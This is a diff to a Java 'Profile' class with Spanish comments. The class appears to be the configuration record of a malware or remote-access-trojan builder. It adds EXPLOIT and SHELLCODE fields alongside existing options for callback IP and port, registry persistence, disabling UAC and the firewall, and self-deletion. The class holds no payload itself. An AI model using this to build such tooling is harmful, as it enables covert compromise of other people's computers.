@@ -3,6 +3,7 @@ package net.jlxip.mermaid;
 public class Profile {
     // CREAMOS VARIABLES GLOBALES
     String NAME;
+    String EXPLOIT;
     String IP;
     String PORT;
     String PATH;
@@ -14,11 +15,13 @@ public class Profile {
     String DISABLEFIREWALL;
     String ADDFIREWALL;
     String MELT;
+    String SHELLCODE;
     
-    public Profile(String NAME, String IP, String PORT,
-    String PATH, String FILE, String ADFOLDER, String HKCU, String HKLM, String DISABLEUAC, String DISABLEFIREWALL, String ADDFIREWALL, String MELT){
+    public Profile(String NAME, String EXPLOIT, String IP, String PORT,
+    String PATH, String FILE, String ADFOLDER, String HKCU, String HKLM, String DISABLEUAC, String DISABLEFIREWALL, String ADDFIREWALL, String MELT, String SHELLCODE){
         // RELLENAMOS LAS VARIABLES GLOBALES CON LAS RECIBIDAS POR ARGUMENTOS
         this.NAME = NAME;
+        this.EXPLOIT = EXPLOIT;
         this.IP = IP;
         this.PORT = PORT;
         this.PATH = PATH;
@@ -30,6 +33,7 @@ public class Profile {
         this.DISABLEFIREWALL = DISABLEFIREWALL;
         this.ADDFIREWALL = ADDFIREWALL;
         this.MELT = MELT;
+        this.SHELLCODE = SHELLCODE;
         
         if(ADFOLDER.equals("")){    // Si ADFOLDER está vacío...
             ADFOLDER = "NULL";  // Ponemos NULL (para que no haya errores cargándo el archivo "profiles.dat"
@@ -46,18 +50,21 @@ public class Profile {
     
     public String getString(){  // FUNCIÓN PARA CONVERTIR EL PERFIL A STRING
         String str = "";    // Creamos la variable vacía
-        str = str + NAME + "|";     // Y vamos añadiendo los datos con el delimitador |
-        str = str + IP + "|";
-        str = str + PORT + "|";
-        str = str + PATH + "|";
-        str = str + FILE + "|";
-        str = str + ADFOLDER + "|";
-        str = str + HKCU + "|";
-        str = str + HKLM + "|";
-        str = str + DISABLEUAC + "|";
-        str = str + DISABLEFIREWALL + "|";
-        str = str + ADDFIREWALL + "|";
-        str = str + MELT + "|";
+        
+        str += NAME + "|";     // Y vamos añadiendo los datos con el delimitador |
+        str += EXPLOIT + "|";
+        str += IP + "|";
+        str += PORT + "|";
+        str += PATH + "|";
+        str += FILE + "|";
+        str += ADFOLDER + "|";
+        str += HKCU + "|";
+        str += HKLM + "|";
+        str += DISABLEUAC + "|";
+        str += DISABLEFIREWALL + "|";
+        str += ADDFIREWALL + "|";
+        str += MELT + "|";
+        str += SHELLCODE + "|";
         
         return str;     // Returnamos el String
     }
